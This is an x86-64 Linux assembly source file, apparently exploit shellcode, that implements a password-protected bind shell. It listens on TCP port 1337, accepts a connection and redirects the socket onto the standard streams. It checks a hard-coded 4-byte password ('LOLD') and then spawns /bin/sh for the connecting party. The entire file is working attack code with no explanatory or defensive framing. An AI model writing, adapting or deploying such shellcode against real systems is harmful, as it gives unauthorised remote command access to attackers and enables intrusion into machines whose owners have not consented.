global _start 

section .text

_start:
	jmp real_start 
	pass: db 'LOLD', 0x4

real_start:
	xor rax, rax
	xor rdi, rdi 
	;rsi 
	xor rdx, rdx 
	xor r10, r10 

;int sockfd = socket(domain, type, protocol)
	; socket syscall = 41
	
	push 41
	pop rax


	inc rdi
	mov rsi, rdi 
	inc rdi 
	; domain = rdi = 2
	; type = rsi = 1 
	;protocol = rdx = 0 
	syscall 


; int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);

	xchg rdi, rax 
	;lets first prepare sockaddr structure 
	push 2
     	mov word [rsp + 2], 0x3905
     	push rsp      
     	pop rsi ; point to the structure


	

	; bind syscall = 49 
	; sockfd = rdi 
	; rsi already set to a pointer to a sockaddr structur
	; rdx = socklen_t = 16
	push 16
	pop rdx
	push 49
	pop rax
	syscall 

; listen(sockfd, 0 ) 
	xchg rsi, r10 ; r10 = 0 , rsi = 0 
	push 50
	pop rax

	syscall

; accept(sockfd, NULL, NULL) 
	xchg rsi, r10
	mov rsi, r10
	mov rdx, r10  
	push 43
	pop rax 

	syscall 


	xchg rax, rdi ;  


; dup2(oldfd, newfd)
	push 3
	pop rsi

loop_dup2:
	push 33 ; dup2
	pop rax
	dec esi
	syscall
	loopnz loop_dup2

;read(fd, input, 4)

        mov rax, r10
	push rax 
	pop rdi 

	push rax
	mov rsi, rsp 
	push 0x4
	pop rdx 
	
	syscall

	mov eax, [rel pass]
	mov rdi,  rsp
	scasd 
	jne exit






;execve("/bin/sh", NULL, NULL);
        mov rax, r10
        push rax
        mov rbx, 0x68732f2f6e69622f
        push rbx
        mov rdi, rsp
        push rax
        mov rdx, rsp
        push rdi
        mov rsi, rsp
        push 59
	pop rax 
        syscall

exit:
	push 60 ; gracefull exit 
	pop rax 
	syscall
	
